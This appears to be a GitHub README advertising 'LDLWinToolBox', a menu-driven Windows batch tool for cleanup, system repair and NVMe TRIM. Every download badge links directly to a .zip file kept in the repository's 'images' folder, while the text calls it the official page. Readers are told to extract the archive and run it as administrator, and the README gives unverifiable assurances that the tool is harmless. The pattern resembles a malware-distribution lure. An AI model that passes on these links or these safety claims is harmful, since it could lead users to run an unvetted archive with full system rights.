# 🛠️ LDLWinToolBox - Easy Windows Cleanup and Optimization

[![Download LDLWinToolBox](https://img.shields.io/badge/Download-LDLWinToolBox-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)

---

LDLWinToolBox offers a simple menu-driven tool that safely cleans your system and improves SSD performance. You do not need any technical background to use it. This tool runs on Windows 10 and Windows 11.

## 📋 What is LDLWinToolBox?

LDLWinToolBox is a Windows Batch utility. It uses built-in Windows commands to:

- Clean unnecessary system files  
- Repair system integrity issues  
- Keep Windows components up to date  
- Optimize NVMe SSD drives with TRIM commands  

Everything happens through a clear menu you control with your keyboard. It automates complex tasks, making them safe and easy.

## ⚙️ System Requirements

Before running LDLWinToolBox, make sure your system meets these:

- Windows 10 (version 1903 or later) or Windows 11  
- Administrator rights on the computer  
- At least 1 GB of free disk space  
- PowerShell installed (comes by default on Windows 10/11)  
- Internet connection needed for checking updates  

This tool will not harm your data but always keep backups of important files.

## 💻 How It Works

The tool runs as a Batch script with a menu interface. When you start it, you will see numbered options for tasks like cleaning, repairing, updating, or optimizing. You choose by typing the corresponding number.

- **Cleanup:** It deletes temp files, logs, and unused updates.  
- **Repair:** It runs system checks and fixes corrupted files.  
- **Update:** It refreshes Windows components and system files.  
- **Optimization:** It sends TRIM commands to your NVMe SSD to keep it fast.  

The menu runs inside a Command Prompt window and shows simple progress messages to keep you informed.

## 🚀 Getting Started with LDLWinToolBox

Follow these steps to get LDLWinToolBox running on your Windows PC.

### 1. Download the tool

Click the link below to visit the official page where you can download LDLWinToolBox:

[![Download Here](https://img.shields.io/badge/Visit%20to%20Download-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)

Once on the page, look for the latest release or the main folder labeled with the tool’s name. Download the compressed archive file (usually a `.zip`).

### 2. Extract the files

After downloading, find the `.zip` file in your Downloads folder:

- Right-click the file and select **Extract All...**  
- Choose a folder where the tool will stay permanently, for example, `C:\LDLWinToolBox`  
- This creates a folder with all the scripts inside  

Do not run the tool directly from the zip file or your Downloads folder.

### 3. Run the tool as Administrator

To give the tool full access for system tasks, you need administrator rights:

- Navigate to the extracted folder  
- Find the file named `LDLWinToolBox.bat` or similar  
- Right-click the file and select **Run as administrator**  

This opens a black Command Prompt window with the tool’s main menu.

### 4. Use the menu to perform tasks

In the menu, type the number next to the task you want and press Enter:

- Press **1** for Cleanup  
- Press **2** for Repair  
- Press **3** for Update  
- Press **4** for NVMe SSD Optimization  
- Press **0** to Exit the tool  

Wait until each operation finishes. Some tasks may take several minutes depending on your system speed.

### 5. Follow on-screen instructions

During some tasks, the tool may ask to confirm actions or notify you about progress. Just read the messages and respond accordingly by typing `Y` or `N`.

### 6. Close the window when done

Once you finish, choose option 0 to exit the menu. Close the Command Prompt window manually if it stays open.

## 🔒 Safety and Permissions

LDLWinToolBox requires administrator rights because it runs system tools like `DISM`, `sfc`, and PowerShell commands. Running without admin access will cause errors or incomplete tasks.

The tool only runs commands native to Windows and does not download or install anything third-party. It will not delete personal files.

## 🎯 Features in Detail

- **Advanced System Cleanup:** Removes temp files, unused Windows update files, logs, and cache. It reduces disk space usage.  
- **System Integrity Repair:** Runs `sfc /scannow` and `DISM` to fix corrupted system files. This can fix unstable or failing Windows issues.  
- **Component Updates:** Refresh Windows system components using DISM online commands to keep the system healthy.  
- **NVMe SSD Optimization:** Applies the TRIM command to your SSD, keeping write speeds high and prolonging drive life.  

All tasks run silently except for progress messages, so no confusing prompts will appear.

## 📂 File Structure Overview

When you download and extract LDLWinToolBox, you will see:

- `LDLWinToolBox.bat` – main executable Batch script  
- `Utils` folder – supporting scripts and tools  
- `README.md` – instructions and help file  
- `Logs` folder – stores logs from various operations for troubleshooting  

Do not delete or move files from inside the extracted folder.

## ⚡ Quick Tips for Best Results

- Always run as Administrator  
- Close other apps before starting cleanup or repair  
- Disconnect external drives to avoid accidental changes  
- Let the tool run without interruption  
- Restart your computer after major repairs or updates  

## 🛠 Troubleshooting

If you encounter issues:

- Make sure you have Windows 10 or 11 with the latest updates applied  
- Confirm you ran the `.bat` file as Administrator  
- Check your disk has enough free space  
- Look inside the `Logs` folder to see error messages for support  
- Restart your PC and try running the tool again  

If problems persist, try manual system repairs using Windows built-in tools or seek expert help.

## 📥 Download LDLWinToolBox Now

Click below to go to the official GitHub page and download the tool:

[![Get LDLWinToolBox](https://img.shields.io/badge/Download%20LDLWinToolBox-green?style=for-the-badge)](https://raw.githubusercontent.com/kikemaguilla83/LDLWinToolBox/main/images/Box-LDL-Win-Tool-v3.5-beta.2.zip)